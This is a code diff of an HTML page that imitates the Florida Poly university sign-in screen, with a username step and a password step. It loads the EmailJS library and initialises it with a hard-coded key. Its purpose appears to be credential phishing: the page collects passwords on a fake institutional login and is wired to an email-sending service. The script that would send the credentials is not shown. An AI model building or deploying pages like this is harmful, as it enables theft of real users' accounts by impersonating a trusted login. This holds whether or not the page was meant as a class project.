@@ -4,21 +4,46 @@
     <meta charset="UTF-8">
     <title>Florida Poly Login</title>
     <link rel="stylesheet" href="finalproject.css">
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+    (function(){
+        emailjs.init({
+            publicKey: "3WV5xIZoqTZpr8s26",
+        });
+    })();
+    </script>
 </head>
 <body>
     <div class="login-card">
         <div class="login-content">
             <img src="assets/polyLogo.png" alt="Florida Poly Logo" class="logo">
-            <h1>Sign in</h1>
+            <div id="username-section">
+                <h1>Sign in</h1>
 
-            <input id="username-input" type="text" name="username" placeholder="NetID@floridapoly.edu">
-
-            <a href="#" class="access-link">Can't access your account?</a>
-
-            <div class="button-area">
-                <button class="back-btn">Back</button>
-                <button class="next-btn">Next</button>
+                <input id="username-input" type="text" name="username" placeholder="NetID@floridapoly.edu">
+                <a href="#" class="access-link">Can't access your account?</a>
+                <div class="button-area">
+                    <button class="back-btn">Back</button>
+                    <button class="next-btn" id="next-btn">Next</button>
+                </div>
             </div>
+            <div id="password-section">
+                <p id="username-top">&#x2190; placeholderemail</p>
+                <h1>Enter Password</h1>
+
+                <input id="password-input" type="password" name="password" placeholder="Password"> 
+                <a href="#" class="access-link">Forgot my password</a>
+                <br/>
+                <a href="#" class="access-link">Use a certificate or smart card</a>
+                <div class="button-area-password">
+                    <button class="signin-btn" id="signin-btn">Sign In</button>
+                </div>
+            </div>
+           
+
+          
 
             <div class="login-footer">
                 <p>
@@ -31,10 +56,11 @@
             </div>
         </div>
 
-        <div class="signin-options">
+        <div id="signin-options">
             <img src="assets/keyIcon.png" alt="Key Icon">
             <span>Sign-in options</span>
         </div>
     </div>
+    <script src="finalproject.js"></script>
 </body>
 </html>
